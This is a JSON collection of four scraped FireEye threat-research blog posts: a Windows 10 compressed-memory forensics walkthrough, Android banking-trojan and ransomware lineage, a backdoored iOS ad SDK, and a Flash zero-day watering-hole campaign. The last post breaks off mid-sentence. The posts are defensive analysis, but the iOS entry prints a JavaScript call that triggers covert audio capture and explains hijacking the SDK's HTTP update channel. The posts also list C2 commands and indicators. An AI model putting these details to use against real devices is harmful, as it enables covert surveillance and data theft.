            "http://www.fireeye.com/blog/threat-research/2019/08/finding-evil-in-windows-ten-compressed-memory-part-two.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2019-08-08",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction This blog post is the second in a three-part series covering our Windows 10 memory forensics research and it coincides with our BlackHat USA 2019 presentation. In Part One of the series , we covered the integration of the research in both Volatily and Rekall memory forensics tools. We demonstrated that forensic artifacts (including reflectively loaded malware) could remain undiscovered without the FLARE research integration on Windows 10 (available on GitHub at win10_volatility and win10_rekall ). In this post, we demonstrate how to retrieve a compressed page using the structures and algorithms described in our white paper . We track down a compressed page in memory, beginning at its virtual address within a known process. A WinDbg kernel debugger setup is used in this walkthrough, but a similar process could be followed from within a memory snapshot or extraction using Volatility or Rekall . Finding a Compressed Page The operating system used in this demo is Windows 10.0.15063.0 (x64) and the structure definitions shown will be applicable across any 1703 build. Note that the two global offsets nt!SmGlobals and nt!MmPagingFile will need to be located for each revision. The process of retrieving these global offsets is described further in our white paper . To begin analysis, we create a marker page and flush it to the Virtual Store. This can be done in several ways, the easiest of which is allocating memory in a memory constrained virtual machine.  A simple utility ( ram_eater.exe ) was created to perform this task. The ram_eater utility allocates and writes a marker page, and then repeatedly allocates more memory in user-specified page amounts. In a memory constrained virtual machine (1 GB RAM), the marker page will become stale shortly and be evicted to the virtual store. In Figure 1, ram_eater reports that it has allocated the marker page at address 0x2a368480000 . The marker page we used (see Figure 2) was a string beginning with “ CC WAS HERE! ”. Figure 1: Allocating a marker page using ram_eater_x64.exe We can verify the contents of our marker page by locating it in the kernel debugger, viewing its Page Table Entry (PTE) and dumping its corresponding physical memory (see Figure 2). We use the !process extension to locate ram_eater ’s EPROCESS structure and switch into the context of the ram_eater process. This ensures that we traverse the correct process-specific page tables for the ram_eater process. Using the page frame number ( pfn ) described by the hardware PTE, we dump the physical memory to validate the contents of our marker page. Page frame numbers do not include the low-order bits used to specify an offset into a page, therefore they must be multiplied by PAGE_SIZE ( 0x1000 ) to identify the actual address of the data. Figure 2: Locating and viewing the marker page from the kernel debugger After allocating additional memory using ram_eater , we check to see if the marker page has been sent to the virtual store. Each entry in the output of the !vm extension can be treated as an index in to nt!MmPagingFile (see Figure 3). Figure 3: PTE of a compressed page in the virtual store an confirmation of virtual store’s PageFile index In the PTE displayed in Figure 3, the PageFile index ( MMPTE_SOFTWARE.PageFileLow ) is 2 and corresponds to the “No Name for Paging File” entry in the !vm extension’s output. From general observation, we know that on a default Windows configuration, the last entry corresponds to the virtual store. It is possible to configure systems with more than a single PageFile on disk, so do not assume that PageFile index 2 will always correlate to the virtual store. A more thorough option to validate page file indices is to disassemble nt!MmStoreCheckPagefiles . This function contains references to two global variables, the number of active PageFiles, as well as an array of pointers to each nt!_MMPAGING_FILE structure (see Figure 4). We use the PageFile structure’s newly introduced VirtualStorePagefile field to confirm if the PageFile represents a virtual store. Figure 4: Locating nt!MmPagingFile in WinDbg and dumping system’s nt!_MMPAGING_FILE structures Having confirmed that the marker page is in the virtual store, the next step is to calculate the Store Manager Page Key ( SM_PAGE_KEY ), as it serves as a pseudo-handle to locate the decompressed page. Our white paper details the process used to calculate the SM_PAGE_KEY , which turns out to be 0x201a3061 for this example. Note, that we will not use the PTE’s swizzle bit in the page key calculations, since the OS build is below 1803. To begin page retrieval, the pointer to the Store Manager’s global structure or nt!SmGlobals needs to be located. This is a straightforward process if symbols are available (see Figure 5). Figure 5: Dumping nt!SmGlobals The first thing to observe is that both SMKM_STORE_MGR and SMKM are located at offset 0x0 , or directly at nt!SmGlobals . Viewed as a memory dump, nt!SmGlobals appears as an array of pointers. Viewed as a two-dimensional array (32x32) of SMKM_STORE_METADATA elements, each element in the array of pointers points to an array of 32 SMKM_STORE_METADATA structures. Each SMKM_STORE_METADATA structure represents a store. To locate our SM_PAGE_KEY ’s corresponding store, we need to find the store index associated with the page key inside the SMKM_STORE_MGR.sGlobalTree B+tree container. The store index is a compound value that yields both indices needed to select the particular SMKM_STORE_METADATA element. Let’s traverse the SMKM_STORE_MGR ’s global B+tree (Figure 6). Recall that we are interested in a store manager page key value of 0x201a3061 . Figure 6: Traversing the global B+tree Now that we have the store index (obtained from the SMKM_FRONTEND_ENTRY structure) we calculate both indices to select the correct SMKM_STORE_METADATA structure for our SM_PAGE_KEY . The index in to the pointer array is the result of dividing the retrieved store index by 32, while the second one is the remainder of the division operation. In our case both indices are 0 and they select the first of the 1024 stores on the system, which is reserved for legacy applications. Universal Windows Platform (UWP) applications, on the other hand, will be placed in stores from 1 to 1023. Now, with the SMKM_STORE_METADATA known, we examine the store’s SMKM_STORE structure, as shown in Figure 7. Figure 7: Dumping the SMKM_STORE structure Once we have our SMKM_STORE structure we traverse another B+tree that associates our SM_PAGE_KEY ( 0x201a3061 ) with a chunk key. The chunk key is a compound value and once decoded points to a specific page record inside SMHP_CHUNK_METADATA 's two-dimensional aChunkPointer array. The B+tree traversal is shown in Figure 8. Figure 8: Traversing the local B+tree to find the chunk key associated with the SM_PAGE_KEY After the B+tree traversal is complete we found that our chunk key is 4b02d . Since it’s a compound value we need to decode it in order to retrieve the two indices into SMHP_CHUNK_METADATA ’s chunk pointer array, and the offset within the located chunk. The decoding involves four additional SHMP_CHUNK_METADATA fields – dwVectorSize , dwPageRecordsPerChunk , dwPageRecordSize , and dwChunkPageHeaderSize . The process is shown in Figure 9. Figure 9: Retrieving the page record associated with the chunk key The decoding of the chunk key in Figure 9 allowed us to find all the information to derive the virtual address of our compressed page. The retrieved REGION_KEY ( 0xf72397 , in our case) is also a compound value that encodes the index within the SMKM_STORE ’s region pointer array, as well as the offset within the region of pages. To calculate this data, we parse the region key with the help of two fields inside the ST_DATA_MGR structure – dwRegionIndexMask and dwRegionSizeMask . The calculations are shown in Figure 10. Figure 10: Calculating the compressed page’s virtual address The virtual address 0x12f3970 calculated in Figure 10 contains the compressed page of interest. We can retrieve it from the MemCompression process space, as shown in Figure 11. To confirm that the compressed memory is located within MemCompression , check the SMKM_STORE structure’s StoreOwnerProcess field. Figure 11: Retrieving the compressed page from within MemCompression process space The compressed page can be decompressed with a call to the RtlDecompressBufferEx API or any other implementation that supports the XPRESS compression algorithm. Conclusion In this blog post, we shared a walkthrough in which we forced a known marker page into the compression store and manually retrieved it by walking through memory dumps using known structure offsets from Windows 10 1709 x64. The same techniques used here can be applied to Windows 10 1607 and onwards assuming correct structure offsets are known. In Part 3 of the series, Automating Undocumented Structure Extraction , we will look at how the FLARE team leveraged emulation via flare-emu to automate the extraction of the structures used in this walkthrough. Resources White paper Finding Evil in Windows 10 Compressed Memory, Part One: Volatility and Rekall Tools Finding Evil in Windows 10 Compressed Memory, Part Three: Automating Undocumented Structure Extraction FLARE Windows 10 Volatility Plugin FLARE Windows 10 Rekall Plugin Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2016/03/android-malware-families.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2016-03-11",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction On Feb. 19, IBM XForce researchers released an intelligence report [ 1 ] stating that the source code for GM Bot was leaked to a crimeware forum in December 2015. GM Bot is a sophisticated Android malware family that emerged in the Russian-speaking cybercrime underground in late 2014. IBM also claimed that several Android malware families recently described in the security community were actually variants of GM Bot, including Bankosy[ 2 ], MazarBot[ 3 ], and the SlemBunk malware recently described by FireEye[ 4 , 5 ]. Security vendors may differ in their definition of a malware “variant.” The term may refer to anything from almost identical code with slight modifications, to code that has superficial similarities (such as similar network traffic) yet is otherwise very different. Using IBM’s reporting, we compared their GM Bot samples to SlemBunk. Based on the disassembled code of these two families, we agree that there are enough code similarities to indicate that GM Bot shares a common origin with SlemBunk. Interestingly, our research led us to identify an earlier malware family named SimpleLocker – the first known file-encryption ransomware on Android [ 6 ] – that also shares a common origin with these banking trojan families. GM Bot and SlemBunk Our analysis showed that the four GM Bot samples referenced by IBM researchers all share the same major components as SlemBunk. Figure 1 of our earlier report [ 4 ] is reproduced here, which shows the major components of SlemBunk and its corresponding class names: ServiceStarter : An Android receiver that will be invoked once an app is launched or the device boots up. Its functionality is to start the monitoring service, MainService , in the background. MainService : An Android service that runs in the background and monitors all running processes on the device. It prompts the user with an overlay view that resembles the legitimate app when that app is launched. This monitoring service also communicates with a remote host by sending the initial device data and notifying of device status and app preferences. MessageReceiver : An Android receiver that handles incoming text messages. In addition to the functionality of intercepting the authentication code from the bank, this component also acts as the bot client for remote command and control (C2). MyDeviceAdminReceiver : A receiver that requests administrator access to the Android device the first time the app is launched. This makes the app more difficult to remove. Customized UI views: Activity classes that present fake login pages that mimic those of the real banking apps or social apps to phish for banking or social account credentials. Figure 1. Major components of SlemBunk malware family The first three GM Bot samples have the same package name as our SlemBunk sample. In addition, the GM Bot samples have five of the same major components, including the same component names, as the SlemBunk sample in Figure 1. The fourth GM Bot sample has a different initial package name, but unpacks the real payload at runtime. The unpacked payload has the same major components as the SlemBunk sample, with a few minor changes on the class names: MessageReceiver replaced with buziabuzia , and MyDeviceAdminReceiver replaced with MDRA . Figure 2. Code Structure Comparison between GM Bot and SlemBunk Figure 2 shows the code structure similarity between one GM Bot sample and one SlemBunk sample (SHA256 9425fca578661392f3b12e1f1d83b8307bfb94340ae797c2f121d365852a775e and SHA256 e072a7a8d8e5a562342121408493937ecdedf6f357b1687e6da257f40d0c6b27 for GM Bot and SlemBunk, respectively). From this figure, we can see that the five major components we discussed in our previous post [ 4 ] are also present in GM Bot sample. Other common classes include: Main , the launching activity of both samples. MyApplication , the application class that starts before any other activities of both samples. SDCardServiceStarter , another receiver that monitors the status of MainService and restarts it when it dies. Among all the above components and classes, MainService is the most critical one. It is started by class Main at the launching time, keeps working in the background to monitor the top running process, and overlays a phishing view when a victim app (e.g., some mobile banking app) is recognized. To keep MainService running continuously, malware authors added two receivers – ServiceStarter and SDCardServiceStarter – to check its status when particular system events are received. Both GM Bot and SlemBunk samples share the same architecture. Figure 3 shows the major code of class SDCardServiceStarter to demonstrate how GM Bot and SlemBunk use the same mechanism to keep MainService running. Figure 3. Method onReceive of SDCardServiceStarter for GM Bot and SlemBunk From this figure, we can see that GM Bot and SlemBunk use almost identical code to keep MainService running. Note that both samples check the country in system locale and avoid starting MainService when they find the country is Russia. The only difference is that GM Bot applies renaming obfuscation to some classes, methods and fields. For example, static variable “MainService;->a” in GM Bot has the same role as static variable “MainService;->isRunning” in SlemBunk. Malware authors commonly use this trick to make their code harder to understand. However this won’t change the fact that the underlying codes share the same origin. Figure 4 shows the core code of class MainService to demonstrate that GM Bot and SlemBunk actually have the same logic for main service. In Android, when a service is started its onCreate method will be called. In method onCreate of both samples, a static variable is first set to true. In GM Bot, this variable is named “a”, while in SlemBunk it is named “isRunning”. Then both will move forward to read an app particular preference. Note that the preferences in both samples have the same name: “AppPrefs”. The last tasks of these two main services are also the same. Specifically, in order to check whether any victim apps are running, a runnable thread is scheduled. If a victim app is running, a phishing view is overlaid on top of that of the victim app. The only difference here is also on the naming of the runnable thread. Class “d” in GM Bot and class “MainService$2” in SlemBunk are employed respectively to conduct the same credential phishing task. Figure 4. Class MainService for GM Bot and SlemBunk In summary, our investigation into the binary code similarities supports IBM’s assertion that GM Bot and SlemBunk share the same origin. SimpleLocker and SlemBunk IBM noted that GM Bot emerged in late 2014 in the Russian-speaking cybercrime underground. In our research, we noticed that an earlier piece of Android malware named SimpleLocker also has a code structure similar to SlemBunk and GM Bot. However, SimpleLocker has a different financial incentive: to demand a ransom from the victim. After landing on an Android device, SimpleLocker scans the device for certain file types, encrypts them, and then demands a ransom from the user in order to decrypt the files. Before SimpleLocker’s emergence, there were other types of Android ransomware that would lock the screen; however, SimpleLocker is believed to be the first file-encryption ransomware on Android. The earliest report on SimpleLocker we identified was published by ESET in June 2014 [ 6 ]. However, we found an earlier sample in our malware database from May 2014 (SHA256 edff7bb1d351eafbe2b4af1242d11faf7262b87dfc619e977d2af482453b16cb). The compile date of this app was May 20, 2014. We compared this SimpleLocker sample to one of our SlemBunk samples (SHA256 f3341fc8d7248b3d4e58a3ee87e4e675b5f6fc37f28644a2c6ca9c4d11c92b96) using the same methods used to compare GM Bot and SlemBunk. Figure 5 shows the code structure comparison between these two samples. Note that this SimpleLocker variant also has the major components ServiceStarter and MainService , both used by SlemBunk. However, the purpose of the main service here is not to monitor running apps and provide phishing UIs to steal banking credentials. Instead, SimpleLocker’s main service component scans the device for victim files and calls the file encryption class to encrypt files and demand a ransom. The major differences in the SimpleLocker code are shown in the red boxes: AesCrypt and FileEncryptor. Other common classes include: Main , the launching activity of both samples. SDCardServiceStarter , another receiver that monitors the status of MainService and restarts it when it dies. Tor and OnionKit, third-party libraries for private communication. TorSender , HttpSender and Utils , supporting classes to provide code for CnC communication and for collecting device information. Figure 5. Code structure comparison between SimpleLocker and SlemBunk samples Finally, we located another SimpleLocker sample (SHA256 304efc1f0b5b8c6c711c03a13d5d8b90755cec00cac1218a7a4a22b091ffb30b) from July 2014, about two months after the first SimpleLocker sample. This new sample did not use Tor for private communications, but shared four of the five major components as the SlemBunk sample (SHA256: f3341fc8d7248b3d4e58a3ee87e4e675b5f6fc37f28644a2c6ca9c4d11c92b96). Figure 6 shows the code structure comparison between these two samples. Figure 6. Code structure comparison between SimpleLocker and SlemBunk variants As we can see in Figure 6, the new SimpleLocker sample used a packaging mechanism similar to SlemBunk, putting HttpSender and Utils into a sub-package named “utils”. It also added two other major components that were originally only seen in SlemBunk: MessageReceiver and MyDeviceAdminReceiver . In total, this SimpleLocker variant shares four out of five major components with SlemBunk. Figure 7 shows the major code of MessageReceiver in the previous samples to demonstrate that SimpleLocker and SlemBunk use basically the same process and logic to communicate with the CnC server. First, class MessageReceiver registers itself to handle incoming short messages, whose arrival will trigger its method onReceive . As seen from the figure, the main logics here are basically the same for SimpleLocker and SlemBunk. They first read the value of a particular key from app preferences. Note that the names for the key and shared preference are the same for these two different malware families: key is named “CHECKING_NUMBER_DONE” and preference named “AppPrefs”.  The following steps call method retrieveMessage to retrieve the short messages, and then forward the control flow to class SmsProcessor . The only difference here is that SimpleLocker adds one extra method named processControlCommand to forward control flow. Class SmsProcessor defines the CnC commands supported by the malware families. Looking into class SmsProcessor , we identified more evidence that SimpleLocker and SlemBunk are of the same origin. First, the CnC commands supported by SimpleLocker are actually a subset of those supported by SlemBunk. In SimpleLocker, CnC commands include \"intercept_sms_start\", \"intercept_sms_stop\", \"control_number\" and \"send_sms\", all of which are also present in SlemBunk sample. What is more, in both SimpleLocker and SlemBunk there is a common prefix “#” before the actual CnC command. This kind of peculiarity is a good indicator that SimpleLocker and SlemBunk share a common origin. Figure 7. Class MessageReceiver for SimpleLocker and SlemBunk variants The task of class MyDeviceAdminReceiver is to request device administrator privilege, which makes these malware families harder to remove. SimpleLocker and SlemBunk are also highly similar in this respect, supporting the same set of device admin relevant functionalities. At this point, we can see that these variants of SimpleLocker and SlemBunk share four out of five major components and share the same supporting utilities. The only difference is in the final payload, with SlemBunk phishing for banking credentials while SimpleLocker encrypts certain files and demands ransom. This leads us to believe that SimpleLocker came from the same original code base as SlemBunk. Conclusion Our analysis confirms that several Android malware families share a common origin, and that the first known file-encrypting ransomware for Android – SimpleLocker – is based on the same code as several banking trojans. Additional research may identify other related malware families. Individual developers in the cybercrime underground have been proficient in writing and customizing malware. As we have shown, malware with specific and varied purposes can be built on a large base of shared code used for common functions such as gaining administrative privileges, starting and restarting services, and CnC communications. This is apparent simply from looking at known samples related to GM Bot – from SimpleLocker that is used for encryption and ransomware, to SlemBunk that is used as a banking Trojan and for credential theft, to the full-featured MazarBot backdoor. With the leak of the GM Bot source code, the number of customized Android malware families based on this code will certainly increase. Binary code-based study, one of FireEye Labs’ major research tools, can help us better characterize and track malware families and their relationships, even without direct access to the source code. Fortunately, the similarities across these malware families make them easier to identify, ensuring that FireEye customers are well protected. References: [1]. Android Malware About to Get Worse: GM Bot Source Code Leaked [2]. Android.Bankosy: All ears on voice call-based 2FA [3]. MazarBOT: Top class Android datastealer [4]. SLEMBUNK: AN EVOLVING ANDROID TROJAN FAMILY TARGETING USERS OF WORLDWIDE BANKING APPS [5]. SLEMBUNK PART II: PROLONGED ATTACK CHAIN AND BETTER-ORGANIZED CAMPAIGN [6]. ESET Analyzes Simplocker – First Android File-Encrypting, TOR-enabled Ransomware Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/10/ibackdoor_high-risk.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-10-26",
                    "source": "www.fireeye.com"
                },
                "text": "Introduction Recently FireEye mobile researchers discovered a high-risk ad\nlibrary embedded in thousands of iOS apps in the Apple App Store,\nincluding 213 popular apps with more than 1000 user reviews in both\nthe US and Chinese App Stores. As of publication of this blog, 935\naffected apps are still downloadable. The capabilities of this ad\nlibrary go far beyond those of typical adware and clearly violate\nrequirements of Apple’s iOS Developer Program intended to protect\nusers’ security and privacy. The library embeds backdoors in unsuspecting apps that make use of it to display ads, exposing sensitive data and functionality. The backdoors can be controlled remotely by loading JavaScript code from remote servers to perform the following actions: Capture audio and screenshots. Monitor and upload device location. Read/delete/create/modify files in the app’s data container. Read/Write/Reset the app’s keychain (e.g., app password storage). Post encrypted data to remote servers. Open URL schemes to identify and launch other apps installed on the device. “Side-load” non-App Store apps by prompting the user to click an “Install” button. The offending ad library contains identifying data suggesting that it is a version of the mobiSage SDK [1]. We found 17 distinct versions of the backdoored ad library, with version codes between 5.3.3 and 6.4.4. However, in the latest mobiSage SDK publicly released by adSage [2], identified as version 7.0.5, the backdoors are not present. We cannot determine with certainty whether the backdoored versions of the library were actually released by adSage, or whether they were created and/or compromised by a third party. As of publication of this blog, we have identified 2846 apps published in the App Store containing backdoored versions of mobiSage SDK. Among these 2846 apps, we have observed over 900 attempt to contact their command and control (C2) server. We have notified Apple and provided the details to them. These backdoors can be controlled not only by the original creators of the ad library, but potentially also by outside threat actors. While we have not observed commands from the C2 server intended to trigger the most sensitive capabilities such recording audio or stealing sensitive data, there are several ways that the backdoors could be abused by third-party targeted attackers to further compromise the security and privacy of the device and user: An attacker could reverse-engineer the insecure HTTP-based control protocol between the ad library and its server, and then hijack the connection to insert commands to trigger the backdoors and steal sensitive information. A malicious app developer can similarly inject commands, utilizing the library’s backdoors to build their own surveillance app. Since the ad library has passed the App Store review process in numerous apps, this is an attractive way to create an app with these hidden behaviors that will pass under Apple’s radar. App Store Protections Ineffective Despite Apple’s reputation for keeping malware out of the App Store with its strict review process, this case demonstrates that it is still possible for dangerous code that exposes users to critical security and privacy risks to sneak into the App Store by piggybacking on unsuspecting apps. Backdoors that enable silently recording audio and uploading sensitive data when triggered by downloaded code clearly violate the requirements of the iOS Developer Program [3]. The requirements state that apps are not permitted to download code or scripts, with the exception of scripts that “ do not change the primary purpose of the Application by providing features or functionality that are inconsistent with the intended and advertised purpose of the Application as submitted to the App Store .” And, for apps that can record audio, “ a reasonably conspicuous audio, visual or other indicator must be displayed to the user as part of the Application to indicate that a Recording is taking place.” The backdoored versions of mobiSage clearly violate these requirements, yet thousands of affected apps made it past the App Store review process. Technical Details As shown in Figure 1, the backdoored mobiSage library includes two key components, separately implemented in Objective-C and JavaScript. The Objective-C component, which we refer to as msageCore , implements the underlying functionality of the backdoors and exposes interfaces to the JavaScript context through a WebView. The JavaScript component, which we refer to as msageJS , provides high-level execution logic and can trigger the backdoors by invoking the interfaces exposed by msageCore. Each component has its own separate version number. Figure 1: Key components of backdoored mobiSage SDK In the remainder of this section, we reveal internal details of msageCore, including its communication channel and high-risk interfaces. Then, we describe how msageJS is launched and updated, and how it can trigger the backdoors. Backdoors in msageCore Communication channel MsageCore implements a general framework to communicate with msageJS via the ad library’s WebView. Commands and parameters are passed via specially crafted URLs in the format  adsagejs://cmd&parameter. As shown in the reconstructed code fragment in Figure 2, msageCore fetches the command and parameters from the JavaScript context and inserts them in its command queue. Figure 2: Communication via URL loading in WebView. To process a command in its queue, msageCore dispatches the command along with its parameters to a corresponding Objective-C class and method. Figure 3 shows portions of the reconstructed command dispatching code. Figure 3: Command dispatch in msageCore. High-risk interfaces Each dispatched command ultimately arrives at an Objective-C class in msageCore. Table 1 shows a subset of msageCore classes and the corresponding interfaces that they expose. msageCore Class Name Interfaces MSageCoreUIManagerPlugin - captureAudio: - captureImage: - openMail: - openSMS: - openApp: - openInAppStore: - openCamera: - openImagePicker: - ... MSageCoreLocation - start: - stop: - setTimer: - returnLocationInfo:webViewId: - ... MSageCorePluginFileModule - createDir - deleteDir: - deleteFile: - createFile: - getFileContent: - ... MSageCoreKeyChain - writeKeyValue: - readValueByKey: - resetValueByKey: MSageCorePluginNetWork - sendHttpGet: - sendHttpPost: - sendHttpUpload: - ... MSageCoreEncryptPlugin - MD5Encrypt: - SHA1Encrypt: - AESEncrypt: - AESDecrypt: - DESEncrypt: - DESDecrypt: - XOREncrypt: - XORDecrypt: - RC4Encrypt: - RC4Decrypt - ... Table 1: Selected interfaces exposed by msageCore The selected interfaces reveal some of the key capabilities exposed by the backdoors in the library. They expose the ability to capture audio and screenshots while the affected app is in use, identify and launch other apps installed on the device, periodically monitor location, read and write files in the app’s data container, and read/write/reset “secure” keychain items stored by the app. Additionally, any data collected via these interfaces can be encrypted with various encryption schemes and uploaded to a remote server. Beyond the selected interfaces, the ad library exposes users to additional risks by including explicit logic to promote and install “enpublic” apps shown in Figure 4. As we have highlighted in previous blogs [4, 5, 6, 7, 8], enpublic apps can introduce additional security risks by using private APIs, which would normally cause an app to be blocked by the App Store review process. In previous blogs we have described a number of “Masque” attacks utilizing enpublic apps [5, 6, 7], which affect pre-iOS 9 devices. The attacks include background monitoring of SMS or phone calls, breaking the app sandbox, stealing email messages, and demolishing arbitrary app installations. Figure 4: Installing “enpublic” apps to bypass Apple App Store review We can observe the functionality of the ad library by examining the implementations of some of the selected interfaces. Figure 5 shows reconstructed code snippets for capturing audio. Before storing recorded audio to a file audio_xxx.wav, the code retrieves two parameters from the command for recording duration and threshold. Figure 5: Capturing audio with duration and threshold. Figure 6 shows a code snippet for initializing the app’s keychain before reading. The accessed keychain is in the kSecClassGenericPassword class, which is widely used by apps for storing secret credentials such as passwords. Figure 6: Reading the keychain in the kSecClassGenericPassword class. Remote control in msageJS msageJS contains JavaScript code for communicating with a C2 server and submitting commands to msageCore. The file layout of msageJS is shown in Figure 7. Inside sdkjs.js, we find a wrapper object called adsage and the JavaScript interface for command execution. Figure 7: The file layout of msageJS The command execution interface is constructed as follows: adsage.exec(className, methodName, argsList, onSuccess, onFailure); The className and methodName parameters correspond to classes and methods in msageCore. The argsList parameter can be either a list or dict, and the exact types and values can be determined by reversing the methods in msageCore. The final two parameters are function callbacks invoked when the method exits. For example, the following invocation starts audio capture: adsage.exec(\"MSageCoreUIManager\", \"captureAudio\", [\"Hey\", 10, 40],  onSuccess, onFailure); Note that the files comprising msageJS cannot be found by simply listing the files in an affected app’s IPA. The files themselves are zipped and encoded in Base64 in the data section of the ad library binary. After an affected app is launched, msageCore first decodes the string and extracts msageJS to the app’s data container, setting index.html shown in Figure 7 as the landing page in the ad library WebView to launch msageJS. Figure 8: Base64 encoded JavaScript component in zip format. When msageJS is launched, it sends a POST request to hxxp://entry.adsage.com/d/ to check for updates. The server responds with information about the latest msageJS version, including a download URL, as shown in Figure 9. Note that since the request uses HTTP rather than HTTPS, the response can be hijacked easily by a network attacker, who could replace the download URL with a link to malicious JavaScript code that triggers the backdoors. Figure 9: Server response to msageJS update request via HTTP POST Conclusion In this blog, we described a high-risk ad library affecting thousands of iOS apps in the Apple App Store. We revealed the internals of backdoors which can be used to silently record audio, capture screenshots, prompt the user to side-load other high-risk apps, and read sensitive data from the app’s keychain, among other dubious capabilities. We also showed how these backdoors can be controlled remotely by JavaScript code fetched from the Internet in an insecure manner. FireEye Protection Immediately after we discovered the high-risk ad library and affected apps, FireEye updated detection rules in its NX and Mobile Threat Prevention (MTP) products to detect the affected apps and their network activities. In addition, FireEye customers can access the full list of affected apps upon request. FireEye NX customers are alerted if an employee uses an infected app while their iOS device is connected to the corporate network. It is important to note that, even if the servers that the backdoored mobiSage SDK communicates with do not deliver JavaScript code that triggers the high-risk backdoors, the affected apps still try to connect to them using HTTP. This HTTP session is vulnerable to hijacking by outside attackers. FireEye MTP management customers have full visibility into high-risk apps installed on mobile devices in their deployment base. End users receive on-device notifications of the detection and IT administrators receive email alerts. Click here to learn more about FireEye Mobile Threat Protection product. [1] http://www.adsage.com/mobisage [2] http://www.adsage.cn/ [3] https://developer.apple.com/programs/ios/information/iOS_Program_Information_4_3_15.pdf [4] https://www.fireeye.com/blog/threat-research/2015/08/ios_masque_attackwe.html [5] https://www.fireeye.com/blog/threat-research/2015/02/ios_masque_attackre.html [6] https://www.fireeye.com/blog/threat-research/2014/11/masque-attack-all-your-ios-apps-belong-to-us.html [7] https://www.fireeye.com/blog/threat-research/2015/06/three_new_masqueatt.html [8] https://www.virusbtn.com/virusbulletin/archive/2014/11/vb201411-Apple-without-shell Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2015/07/second_adobe_flashz.html": {
                "metadata": {
                    "dateAccessed": "2021-11-21",
                    "dateCreated": "2015-07-19",
                    "source": "www.fireeye.com"
                },
                "text": "On July 14, FireEye researchers discovered attacks exploiting the Adobe Flash vulnerability CVE-2015-5122, just four days after Adobe released a patch. CVE-2015-5122 was the second Adobe Flash zero-day revealed in the leak of HackingTeam’s internal data. The campaign targeted Japanese organizations by using at least two legitimate Japanese websites to host a strategic web compromise (SWC), where victims ultimately downloaded a variant of the SOGU malware. Strategic Web Compromise At least two different Japanese websites were compromised to host the exploit framework and malicious downloads: Japan’s International Hospitality and Conference Service Association (IHCSA) website (hxxp://www.ihcsa[.]or[.]jp) in Figure 1 Figure 1: IHCSA website Japan’s Cosmetech Inc. website (hxxp://cosmetech[.]co[.]jp) The main landing page for the attacks is a specific URL seeded on the IHCSA website (hxxp://www.ihcsa[.]or[.]jp/zaigaikoukan/zaigaikoukansencho-1/), where users are redirected to the HackingTeam Adobe Flash framework hosted on the second compromised Japanese website. We observed in the past week this same basic framework across several different SWCs exploiting the “older” CVE-2015-5119 Adobe Flash vulnerability in Figure 2. Figure 2: First portion of exploit chain The webpage (hxxp://cosmetech[.]co[.]jp/css/movie.html) is built with the open source framework Adobe Flex and checks if the user has at least Adobe Flash Player version 11.4.0 installed. If the victim has the correct version of Flash, the user is directed to run a different, more in-depth profiling script (hxxp://cosmetech.co.jp/css/swfobject.js), which checks for several more conditions in addition to their version of Flash. If the conditions are not met then the script will not attempt to load the Adobe Flash (SWF) file into the user’s browser. In at least two of the incidents we observed, the victims were running Internet Explorer 11 on Windows 7 machines. The final component is delivering a malicious SWF file, which we confirmed exploits CVE-2015-5122 on Adobe Version 18.0.0.203 for Windows in Figure 3. Figure 3: Malicious SWF download SOGU Malware, Possible New Variant After successful exploitation, the SWF file dropped a SOGU variant—a backdoor widely used by Chinese threat groups and also known as “Kaba”—in a temporary directory under “AppData\\Local\\”. The directory contains the properties and configuration in Figure 4. Filename: Rdws.exe Size: 413696 bytes MD5: 5a22e5aee4da2fe363b77f1351265a00 Compile Time: 2015-07-13 08:11:01 SHA256: df5f1b802d553cddd3b99d1901a87d0d1f42431b366cfb0ed25f465285e38d27 SSDeep: 6144:Na/PSOE9OPXCQpA3abFUntBrDP3FVPsCE2NiYfFei78GlGeYO:IPSOE9OPXCQ pAK5YBvPPPrZVkiY2Y Import Hash : ae984e4ab41d192d631d4f923d9210e4 PEHash: 57e6b26eac0f34714252957d26287bc93ef07db2 .text : e683e1f9fb674f97cf4420d15dc09a2b .rdata : 3a92b98a74d7ffb095fe70cf8acacc75 .data : b5d4f68badfd6e3454f8ad29da54481f .rsrc : 474f9723420a3f2d0512b99932a50ca7 C2 Password: gogogod< Memo: 201507122359 Process Inject Targets: %windir%\\system32\\svchost.exe Sogu Config Encoder: sogu_20140307 Mutex Name: ZucFCoeHa8KvZcj1FO838HN&*wz4xSdmm1 Figure 4: SOGU Binary ‘Rdws.exe’ The compile timestamp indicates the malware was assembled on July 13, less than a day before we observed the SWC. We believe the time stamp in this case is likely genuine, based on the time line of the incident. The SOGU binary also appears to masquerade as a legitimate Trend Micro file named “VizorHtmlDialog.exe” in Figure 5. LegalCopyright: Copyright (C) 2009-2010 Trend Micro Incorporated. All rights reserved. InternalName: VizorHtmlDialog FileVersion: 3.0.0.1303 CompanyName: Trend Micro Inc. PrivateBuild: Build 1303 - 8/8/2010 LegalTrademarks: Trend Micro Titanium is a registered trademark of Trend Micro Incorporated. Comments: ProductName: Trend Micro Titanium SpecialBuild: 1303 ProductVersion: 3.0 FileDescription: Trend Titanium OriginalFilename: VizorHtmlDialog.exe Figure 5: Rdws.exe version information The threat group likely used Trend Micro, a security software company headquartered in Japan, as the basis for the fake file version information deliberately, given the focus of this campaign on Japanese organizations. SOGU Command and Control The SOGU variant calls out to a previously unobserved command and control (CnC) domain, “amxil[.]opmuert[.]org” over port 443 in Figure 6. It uses modified DNS TXT record beaconing with an encoding we have not previously observed with SOGU malware, along with a non-standard header, indicating that this is possibly a new variant. Figure 6: SOGU C2 beaconing The WHOIS registrant email address for the domain did not indicate any prior malicious activity, and the current IP resolution (54.169.89.240) is for an Amazon Web Services IP address. Another Quick Turnaround on Leveraging HackingTeam Zero-Days Similar to the short turnaround time highlighted in our blog on the recent APT3/APT18 phishing attacks , the threat actor quickly employed the leaked zero-day vulnerability into a SWC campaign. The threat group appears to have used procured and compromised infrastructure to target Japanese organizations. In two days we have observed at least two victims related to this attack. We cannot confirm how the organizations were targeted, though similar 